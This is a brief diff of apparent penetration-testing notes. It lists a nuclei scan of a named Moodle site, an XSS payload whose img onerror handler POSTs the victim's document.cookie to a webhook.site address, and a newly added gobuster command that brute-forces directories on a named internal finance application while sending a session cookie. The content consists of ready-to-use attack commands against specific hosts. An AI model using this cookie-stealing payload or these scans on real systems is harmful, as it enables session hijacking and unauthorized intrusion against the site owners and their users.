@@ -20,3 +20,5 @@ nuclei -u https://cursos.rizomasur.org -tags moodle
 `
 <img src="x" onerror="fetch('https://webhook.site/de5d7883-a25c-41cd-beb6-113d2b50a605',{method:'POST',body:'cookie='+document.cookie})">
 `
+
+gobuster dir -u https://app.homolog.itamaraty.local/GestaoFinanceira/Pages/Dashboard/   -w /usr/share/wordlists/dirb/common.txt   -t 50   -H 'Host: app.homolog.itamaraty.local'   -H 'Cookie: ASP.NET_SessionId=whvgzv2plsyzvnglugu2kxyc; outro_cookie=valor'   -k -x html,php,js,aspx,bat,txt,zip
